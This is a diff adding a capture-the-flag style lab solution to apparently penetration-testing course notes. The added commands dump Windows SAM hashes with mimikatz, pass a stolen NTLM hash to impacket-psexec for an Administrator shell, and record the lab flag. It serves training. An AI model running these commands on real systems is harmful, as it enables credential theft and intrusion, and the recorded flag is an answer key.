@@ -119,6 +119,35 @@ Using wmiexec to get an interactive shell
 
 Lab 1 - Use the methods from this section to get access to VM #2 and find the flag on the desktop of the user Administrator.
 >``` shell
+>xfreerdp3 /u:gunther /p:password123! /v:192.168.241.211 /cert:ignore
 >
+># Open Powershell as administrator
+>
+>PS C:\Windows\system32> cd C:\tools
+>
+>PS C:\tools> ls
+>
+>PS C:\tools> .\mimikatz.exe
+>
+>mimikatz # privilege::debug
+>
+>mimikatz # token::elevate
+>
+>mimikatz # lsadump::sam
+>
+>impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b \                          
+>Administrator@192.168.241.212
+>
+>C:\Windows\system32> whoami
+>
+>C:\Windows\system32> hostname
+>
+>C:\Windows\system32> ipconfig
+>
+>C:\Windows\system32> cd C:\Users\Administrator\Desktop
+>
+>C:\Users\Administrator\Desktop> dir
+>
+>C:\Users\Administrator\Desktop> type flag.txt
 >```
->
+>OS{572376304974ea8ba660436d50a37490}
